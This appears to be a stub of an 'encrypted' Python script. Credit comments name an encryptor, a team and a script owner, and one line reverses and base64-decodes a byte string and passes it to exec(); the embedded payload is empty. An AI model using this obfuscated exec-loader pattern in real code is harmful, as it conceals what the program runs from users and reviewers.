# encrypt by : Basir kh
# team : afghan tech
# script owner : lord-raghav
# ------------------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))